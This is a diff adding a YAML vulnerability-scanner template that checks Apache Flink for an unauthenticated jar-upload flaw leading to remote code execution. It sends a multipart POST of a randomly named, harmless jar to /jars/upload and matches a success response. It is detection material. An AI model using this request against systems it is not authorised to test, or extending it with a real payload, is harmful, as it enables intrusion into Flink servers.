@@ -1,0 +1,29 @@
+expression: r0()
+id: flink-unauth-rce
+info:
+  author: pikpikcu
+  name: Apache Flink Unauth RCE
+  reference:
+  - https://www.exploit-db.com/exploits/48978
+  - https://adamc95.medium.com/apache-flink-1-9-x-part-1-set-up-5d85fd2770f3
+  - https://github.com/LandGrey/flink-unauth-rce
+  severity: critical
+  verified: true
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("application/json")
+      && response.body.bcontains(b"success") && response.body.bcontains(bytes('_'+r2+'.jar'))
+    request:
+      body: "--WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+        \ name=\"jarfile\";filename=\"{{r2}}.jar\"\r\nContent-Type:application/octet-stream\r\
+        \n\r\n{{randbody}}\r\n--WebKitFormBoundary{{rboundary}}--\r\n"
+      follow_redirects: true
+      headers:
+        Content-Type: multipart/form-data;boundary=WebKitFormBoundary{{rboundary}}
+      method: POST
+      path: /jars/upload
+set:
+  r2: randomLowercase(4)
+  randbody: md5(randstr)
+  randstr: randomLowercase(8)
+  rboundary: randomLowercase(8)
